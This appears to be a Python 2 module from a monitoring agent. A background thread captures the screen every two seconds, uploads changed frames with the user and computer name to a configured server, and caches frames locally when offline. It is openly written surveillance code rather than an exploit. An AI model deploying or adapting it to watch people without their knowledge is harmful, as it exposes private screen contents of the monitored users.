# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import sys
import os
import cStringIO
import time
import base64
from contextlib import closing
import utils
import threading
import logger
from config import config
import requests
import math


log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


class Screenshoter(threading.Thread):
    """
    Делает скриншоты каждые 2с и пытается отправить на сервер.
    Если нет соединения с сервером, то сохраняет последние config[SAVED_IMAGES],
    которые будут отправлены на сервер модулем "uploader" при восстановлении подключения.
    
    Capturing screenshots every 2s and try to upload to server. 
    If no connection, then save it, and will be uploaded later, when connection recover.
    """
    def __init__(self):
        threading.Thread.__init__(self)
        self.name = __name__
        self.daemon = False   
        self.active = False
        
        self.datadir = utils.getDataDIR()     
        self.imagesdir = os.path.join(self.datadir, 'images')  
        self.url = config['URL'] + '/image'
        self.quality = config['SCR_QUALITY']        
        self.maxRMS = config['CHGSCR_THRESHOLD']
        self.img1_histogram, self.img2_histogram = None, None
        self.cookie = {"username": base64.urlsafe_b64encode(utils.getUserName()), \
                       'compname': base64.urlsafe_b64encode(utils.getCompName())}
        
        self.headers = {'user-agent': "{NAME}/{VERSION}".format(**config)}
        
        utils.makedirs(self.datadir)      
        
        
    def stop(self):
        self.active = False
        
      
    def compare_images(self):   
        """
        Сравнение изображений методом среднеквадратичного отклонения
        :return: среднеквадратичное отклонение. Если  0, то изображения одинаковы
        """       
        h1 = self.img1_histogram
        h2 = self.img2_histogram
        rms = math.sqrt(sum(map(lambda a, b: (a - b) ** 2, h1, h2)) / len(h1))
        return rms
        
        
    def run(self): 
        log.info('Start daemon: {0}'.format(self.name))
        from PIL import ImageGrab
        self.active = True
        while self.active:
            try:
                
                utils.makedirs(self.datadir)
                log.debug('Try to grab image')
                
                img = ImageGrab.grab()
                self.img1_histogram = img.histogram()
                rms = self.compare_images() if self.img1_histogram and self.img2_histogram else self.maxRMS + 1
                    
                log.debug("Root Mean Square={}".format(rms))
                if rms > self.maxRMS:
                    self.img2_histogram = self.img1_histogram                        
                    with closing(cStringIO.StringIO()) as fp:       
                        img.save(fp, "JPEG", quality=self.quality) 
                        data = {'data': base64.urlsafe_b64encode(fp.getvalue())}
                        try:
                            log.debug('Try to upload image data')
                            r = requests.post(self.url, data=data, cookies=self.cookie, headers=self.headers, auth=config['AUTH'], timeout=(1, 5))
                            r.raise_for_status()                        
                            if r.content != '1':
                                raise requests.exceptions.HTTPError
                                
                        except Exception as e:
                            log.debug(e)
                            utils.makedirs(self.imagesdir)
                            fn = os.path.join(self.imagesdir, "{0}.jpg".format(time.time())) 
                            log.debug('Try to save: {0}'.format(fn))                       
                            with open(fn, 'wb') as imfp:
                                imfp.write(fp.getvalue())                        
                            for i in os.listdir(self.imagesdir)[-config['SAVED_IMAGES']::-1]:
                                log.debug('Try to delete: {0}'.format(os.path.join(self.imagesdir, i)))  
                                os.unlink(os.path.join(self.imagesdir, i))
            
            except Exception as e:
                log.error(e)
            
            time.sleep(2)
        
if __name__ == "__main__":
    Screenshoter().start()
            
             
        
        
